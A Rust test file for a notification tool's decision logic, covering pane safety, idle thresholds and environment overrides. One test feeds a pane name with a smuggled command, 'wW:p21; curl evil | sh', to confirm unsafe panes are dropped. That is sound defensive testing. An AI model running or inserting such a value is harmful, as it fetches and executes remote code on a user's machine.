//! The decision, pinned: guard.

use super::fixtures::{decide_with, names};
use crate::{EnvironmentSnapshot, Overrides};
use std::collections::BTreeMap;

// --- pane safety --------------------------------------------------------
#[test]
fn an_unsafe_pane_is_dropped_once_for_every_channel() {
    let probes = EnvironmentSnapshot {
        idle: Some(900),
        ..EnvironmentSnapshot::default()
    };
    assert!(decide_with(&probes, &Overrides::default(), "wW:p21; curl evil | sh").pane_dropped);
}

#[test]
fn a_safe_pane_is_not_dropped() {
    let probes = EnvironmentSnapshot {
        idle: Some(900),
        ..EnvironmentSnapshot::default()
    };
    assert!(!decide_with(&probes, &Overrides::default(), "wW:p21").pane_dropped);
}

#[test]
fn a_garbage_desk_threshold_fails_toward_away_never_into_the_default() {
    // Substituting the default would read a stale desk as fresh and hold
    // the operator at a desk they are not at.
    let vars = BTreeMap::from([("PNS_DESK_IDLE_SECS".to_string(), "0600".to_string())]);
    let overrides = Overrides::from_env(&vars);
    let probes = EnvironmentSnapshot {
        idle: Some(5),
        ..EnvironmentSnapshot::default()
    };
    let decision = decide_with(&probes, &overrides, "");
    assert!(names(&decision).contains(&"mobile"));
}

// --- the predicates `start` and the read guards share -------------------
#[test]
fn reads_desk_is_true_only_when_the_idle_guard_below_would_run_the_probe() {
    // ONE SPELLING for the override rule: this is the exact question
    // `start` asks before spawning and the guard asks before reading, so
    // a probe can never be started for an answer the caller already gave.
    assert!(Overrides::default().reads_desk());
    assert!(
        !Overrides {
            idle_invalid: true,
            ..Overrides::default()
        }
        .reads_desk(),
        "a garbled override answers unknown outright"
    );
    assert!(
        !Overrides {
            idle_secs: Some(5),
            ..Overrides::default()
        }
        .reads_desk(),
        "a stated idle clock answers outright"
    );
}

#[test]
fn reads_phone_is_true_only_when_the_phone_guard_below_would_run_the_chain() {
    assert!(Overrides::default().reads_phone());
    assert!(
        !Overrides {
            phone_invalid: true,
            ..Overrides::default()
        }
        .reads_phone()
    );
    assert!(
        !Overrides {
            phone_input_age: Some(5),
            ..Overrides::default()
        }
        .reads_phone()
    );
}

#[test]
fn skip_and_force_parse_from_their_relay_variables() {
    let vars = BTreeMap::from([
        ("PNS_SKIP_PHONE".to_string(), "1".to_string()),
        ("PNS_FORCE_PHONE".to_string(), "1".to_string()),
    ]);
    let overrides = Overrides::from_env(&vars);
    assert!(overrides.skip_phone);
    assert!(overrides.force_phone);
}
